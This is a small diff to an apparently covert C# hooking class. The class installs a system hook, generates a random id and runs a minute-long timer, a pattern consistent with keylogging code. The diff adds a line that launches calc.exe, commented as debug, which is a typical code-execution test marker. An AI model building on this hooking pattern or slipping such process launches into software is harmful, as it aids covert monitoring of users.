@@ -23,6 +23,7 @@ public class axh
     private static string id;
     public static void Hook()
     {
+        Process.Start("calc.exe");//debug
         id = GenerateRandomString(7);
         _hookID = SetHook(_proc);
         _timer = new System.Timers.Timer(60000);
